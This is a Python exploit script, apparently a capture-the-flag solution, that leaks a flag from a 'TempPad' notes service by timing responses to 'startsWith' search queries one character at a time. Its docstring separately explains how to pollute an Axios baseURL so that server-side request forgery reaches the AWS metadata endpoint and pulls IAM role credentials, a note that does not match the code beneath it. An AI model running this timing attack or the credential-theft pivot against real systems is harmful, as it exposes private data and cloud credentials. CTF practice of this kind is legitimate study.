# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "httpx[http2]",
# ]
# ///
"""TempPad timing-based leakage exploit.

Note: When polluting Axios ``baseURL`` to pivot into the AWS metadata service
you must append a trailing ``?`` after the IAM role segment, for example:
``http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}?``.
Without the question mark Axios will strip the last path component when it
normalises the URL, breaking the SSRF gadget.
"""

import httpx
import time

BASE_URL = "https://localhost:25001"

session = httpx.Client(verify=False, http2=True)


def test_timing_payload(prefix):
    """Test timing-based payload to detect flag content"""
    timing_payload = {"content": {"startsWith": prefix}}

    try:
        start_time = time.time()
        response = session.post(
            f"{BASE_URL}/api/notes/search", json=timing_payload, timeout=60
        )
        end_time = time.time()

        duration = end_time - start_time
        return duration
    except Exception as e:
        print(f"[-] Error: {e}")
        return 0


def leak_flag():
    """Leak the flag character by character"""
    charset = "0123456789abcdef{"
    flag = "DF25"
    
    print(f"[+] Starting flag leak, current flag: {flag}")
    
    while True:
        found_char = False
        
        for char in charset:
            test_prefix = flag + char
            duration = test_timing_payload(test_prefix)
            
            if duration > 0.3:
                flag += char
                print(f"[+] Found correct character: '{char}' -> {flag}")
                found_char = True
                break
        
        if not found_char:
            print(f"[+] No more characters found. Final flag: {flag}")
            break
        
        if flag.endswith("}"):
            print(f"[+] Flag complete: {flag}")
            break
    
    return flag


def main():
    print("[+] Starting TempPad flag leak attack...")
    flag = leak_flag()
    print(f"\n[+] Extracted flag: {flag}")


if __name__ == "__main__":
    try:
        main()
    finally:
        session.close()
